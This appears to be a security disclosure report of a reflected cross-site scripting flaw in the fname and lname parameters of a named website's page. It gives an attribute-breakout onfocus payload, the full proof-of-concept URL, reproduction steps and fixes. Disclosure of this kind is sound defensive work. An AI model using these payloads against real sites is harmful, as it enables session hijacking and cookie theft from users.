# Reflected Cross-Site Scripting (XSS) via `fname` and `lname` Parameters

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `fname` and `lname` parameters of the application. User-controlled input is reflected into the HTML response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="f3k8wd"
http://kzlabs.com/5.php?fname=%22%20autofocus%20onfocus=alert(1)%20x=%22&lname=%22+autofocus+onfocus%3Dalert%282%29+x%3D%22
```

---

## Vulnerable Parameters

```text id="p9m2xt"
fname
lname
```

---

## Payloads Used

```html id="q7v4na"
" autofocus onfocus=alert(1) x="
```

```html id="w1c6rz"
" autofocus onfocus=alert(2) x="
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/5.php?fname=%22%20autofocus%20onfocus=alert(1)%20x=%22&lname=%22+autofocus+onfocus%3Dalert%282%29+x%3D%22
   ```

2. Observe that the payloads are reflected into the HTML attributes.

3. The `onfocus` event executes automatically and triggers JavaScript popup dialogs.

---

## Proof of Concept

```text id="n5x8pl"
http://kzlabs.com/5.php?fname=%22%20autofocus%20onfocus=alert(1)%20x=%22&lname=%22+autofocus+onfocus%3Dalert%282%29+x%3D%22
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/5ed22b74-7a0e-4e17-beab-f030d9cc34c8" />


<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/a04c7cc8-4165-4120-aabb-d739cdc2d66c" />


---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft

---

## Recommendations for Fix

* Encode output before rendering
* Validate and sanitize user input
* Escape user-controlled data in HTML attributes
